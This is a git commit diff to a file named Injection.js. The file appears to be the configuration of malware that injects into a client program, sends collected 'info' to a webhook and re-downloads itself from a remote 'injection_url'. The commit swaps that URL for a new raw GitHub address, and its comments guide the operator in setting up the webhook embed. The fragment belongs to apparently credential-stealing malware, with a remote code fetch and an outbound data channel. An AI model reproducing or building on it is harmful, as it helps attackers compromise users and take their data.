275f3ca9a9f932a9bca3c6c77fec69d7d438566e
Dweyks <120561307+Dweyx@users.noreply.github.com>
2023-02-15 14:38:49 +0100

    Update Injection.js

--- Injection.js
+++ Injection.js
@@ -14,7 +14,7 @@ const config = {
   embed_name: 'S/W Injection', //name of the webhook thats gonna send the info
   embed_icon: 'https://www.shutterstock.com/image-vector/s-w-sw-initial-logo-260nw-1707762913.jpg'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 5639644, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: 'https://raw.githubusercontent.com/Dweyks/luna-injection/main/injection.js', //injection url for when it reinjects
+  injection_url: 'https://raw.githubusercontent.com/Dweyx/Injection/main/Injection.js', //injection url for when it reinjects
   /**
    * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
    **/
